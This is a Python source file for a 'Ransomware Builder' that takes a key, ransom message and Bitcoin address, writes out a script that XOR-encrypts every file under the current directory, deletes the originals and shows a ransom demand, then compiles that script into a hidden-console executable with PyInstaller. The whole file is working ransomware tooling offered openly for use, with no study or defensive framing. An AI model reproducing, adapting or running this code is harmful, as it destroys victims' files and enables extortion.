import os
import subprocess

# Function to create the ransomware script
def create_ransomware_script(key, message, bitcoin_address):
    script_content = f"""
import os

# Customizable key, ransom message, and Bitcoin address
key = "{key}"
description = "{message}"
bitcoin_address = "{bitcoin_address}"

def xor_encrypt(data, key):
    encrypted = bytearray()
    key_len = len(key)
    for i, byte in enumerate(data):
        encrypted.append(byte ^ key[i % key_len])
    return encrypted

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()

    encrypted_data = xor_encrypt(data, key.encode('utf-8'))

    encrypted_file_path = file_path + ".encrypted"
    with open(encrypted_file_path, 'wb') as f:
        f.write(encrypted_data)

    os.remove(file_path)

def show_ransom_note():
    print("=====================================")
    print(description)
    print("Send Bitcoin to this address: " + bitcoin_address)
    print("Your files are encrypted with key: " + str(key))
    print("=====================================")

def encrypt_all_files(key):
    # Walk through all files in the current working directory
    for root, dirs, files in os.walk(os.getcwd()):
        for filename in files:
            file_path = os.path.join(root, filename)
            print(f"Encrypting: {file_path}")
            encrypt_file(file_path, key)

if __name__ == "__main__":
    encrypt_all_files(key)
    show_ransom_note()
"""

    # Write the generated ransomware script to a Python file
    with open("generated_ransomware.py", "w") as f:
        f.write(script_content)

    print("Python script generated successfully: generated_ransomware.py")

# Function to compile the Python script to an EXE
def compile_script():
    try:
        print("Compiling Python script into executable...")
        subprocess.run(['pyinstaller', '--onefile', '--noconsole', 'generated_ransomware.py'], check=True)
        print("EXE file has been created in the 'dist' directory!")
    except subprocess.CalledProcessError:
        print("Error compiling the Python script. Ensure PyInstaller is installed.")

# Main function to handle user input
def main():
    print("Welcome to the Ransomware Builder!")

    # Get input from the user
    key = input("Enter the encryption key: ")
    message = input("Enter the ransom note description: ")
    bitcoin_address = input("Enter the Bitcoin address for payment: ")

    # Generate the ransomware script
    create_ransomware_script(key, message, bitcoin_address)

    # Automatically compile the script into an EXE
    compile_script()

if __name__ == "__main__":
    main()
